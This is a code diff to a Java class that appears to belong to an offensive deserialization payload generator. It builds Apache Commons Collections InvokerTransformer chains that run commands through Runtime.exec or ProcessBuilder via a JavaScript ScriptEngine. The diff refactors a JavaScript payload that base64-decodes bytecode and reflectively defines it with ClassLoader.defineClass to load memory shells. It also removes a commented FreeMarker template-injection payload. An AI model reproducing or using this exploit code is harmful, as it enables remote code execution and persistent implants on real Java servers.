@@ -3,11 +3,13 @@ package com.ppp.sinks;
 import com.ppp.JavaClassBuilder;
 import com.ppp.JavaClassHelper;
 import com.ppp.Printer;
+import com.ppp.annotation.JavaClassHelperType;
 import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.CommandUtils;
 import com.ppp.utils.FileUtils;
+import com.ppp.utils.PayloadUtils;
 import com.ppp.utils.maker.CryptoUtils;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -34,7 +36,7 @@ public class InvokerTransformer3 {
      * @return
      */
     @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
-    public Transformer[] runtime(SinksHelper sinksHelper) {
+    public Transformer[] command(SinksHelper sinksHelper) {
         Object command = sinksHelper.getCommand();
         EnchantEnums commandType = sinksHelper.getCommandType();
         boolean split = sinksHelper.isSplit();
@@ -90,33 +92,6 @@ public class InvokerTransformer3 {
 //                break;
 
             case ScriptEngine:
-//                if (codeFile != null) {
-//                    try {
-//                        FileInputStream fileInputStream = new FileInputStream(codeFile);
-//                        byte[] codeBytes = new byte[fileInputStream.available()];
-//                        fileInputStream.read(codeBytes);
-//                        fileInputStream.close();
-//                        code = new String(codeBytes);
-//                    } catch (Exception e) {
-//                        Printer.error("File read error");
-//                    }
-//                }
-//                if (code == null) {
-//                    code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
-//
-//                    if (commandSplit) {
-//                        command = CommandUtils.splitCommandComma((String) command);
-//                        code = String.format("var x=new java.lang.ProcessBuilder;" +
-//                                "x.command(%s);" +
-//                                "x.start();", command);
-//                    }
-////                    Printer.blueInfo("use default code template: " + code);
-//                }
-//                // 模板替换 -cmd -> [ppp]
-//                code = code.replaceAll("\\[ppp\\]", (String) command);
-//
-//                Printer.blueInfo(String.format("js code is: %s", code));
-
                 if (codeFile != null) {
                     try {
 
@@ -355,13 +330,18 @@ public class InvokerTransformer3 {
          */
         byte[] classBytes = null;
         String className = null;
+        String loaderClassName = null;
         // 内存马
         JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
 
         if (javaClassHelper != null) {
             classBytes = JavaClassBuilder.build(javaClassHelper);
             className = javaClassHelper.getCLASSNAME();
-//            System.out.println("Class Name: " + className);
+            if (javaClassHelper.getJavaClassHelperType().equals(JavaClassHelperType.MemShell)) {
+                loaderClassName = javaClassHelper.getLoaderClassName();
+            } else {
+                loaderClassName = javaClassHelper.getCLASSNAME();
+            }
         }
 
         if (classBytes == null) {
@@ -403,25 +383,27 @@ public class InvokerTransformer3 {
 //                    "loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
 //                    "loadedClass.newInstance();";
 
-            String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
-                    "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
-                    "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
-                    "object=aClass.newInstance();" +
-                    "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
-                    "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
-                    "try{" +
-                    "clazz=classLoader.loadClass(\"%s\");" +
-                    "clazz.newInstance();" +
-                    "}catch(err){" +
-                    "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
-                    "defineClassMethod.setAccessible(true);" +
-                    "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
-                    "loadedClass.newInstance();" +
-                    "};", b64, className);
+//            String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
+//                    "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
+//                    "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
+//                    "object=aClass.newInstance();" +
+//                    "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
+//                    "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
+//                    "try{" +
+//                    "clazz=classLoader.loadClass(\"%s\");" +
+//                    "clazz.newInstance();" +
+//                    "}catch(err){" +
+//                    "try{" +
+//                    "classLoader.loadClass(\"%s\");" +
+//                    "clazz.newInstance();" +
+//                    "}catch(e){" +
+//                    "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
+//                    "defineClassMethod.setAccessible(true);" +
+//                    "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
+//                    "clazz.newInstance();" +
+//                    "}};", b64, className, loaderClassName);
 
-
-//            String codec = code.replaceAll("\"", "\\\\\"");
-//            System.out.printf("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}%n", codec);
+            String code = PayloadUtils.loadByScriptEngine(b64, loaderClassName);
 
             transformers = new Transformer[]{
                     new ConstantTransformer(ScriptEngineManager.class),
